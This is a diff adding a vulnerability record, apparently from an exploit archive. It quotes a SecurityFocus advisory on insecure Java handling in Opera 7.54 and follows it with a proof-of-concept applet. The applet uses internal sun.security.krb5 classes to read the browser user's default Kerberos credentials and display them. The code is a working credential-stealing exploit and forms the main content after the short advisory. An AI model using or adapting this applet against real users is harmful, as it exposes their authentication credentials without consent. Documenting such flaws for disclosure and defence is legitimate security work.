@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/11712/info
+  
+Multiple remote vulnerabilities reportedly affect the Opera Web Browser Java implementation. These issues are due to the insecure proprietary design of the Web browser's Java implementation.
+  
+These issues may allow an attacker to craft a Java applet that violate Sun's Java secure programming guidelines.
+  
+These issues may be leveraged to carry out a variety of unspecified attacks including sensitive information disclosure and denial of service attacks. Any successful exploitation would take place with the privileges of the user running the affected browser application.
+  
+Although only version 7.54 is reportedly vulnerable, it is likely that earlier versions are vulnerable to these issues as well.
+
+import sun.security.krb5.*;
+
+public class Opera754KerberosAppletPrint extends java.applet.Applet{
+
+   public void start() {
+
+        int j =
+javax.swing.JOptionPane.showConfirmDialog(null,"Illegalaccess.org | Step1
+Opera 754 FontCrash, wanna crash? ");
+        System.out.println(j);
+        try {
+        Credentials c =  Credentials.acquireDefaultCreds();
+
+        System.out.println(c);
+        j =
+javax.swing.JOptionPane.showConfirmDialog(null,"Illegalaccess.org |Got
+something for ya"+c);
+
+        }
+        catch (Exception e) {
+        j = javax.swing.JOptionPane.showConfirmDialog(null,e.toString());
+
+        }
+   }
+
+}
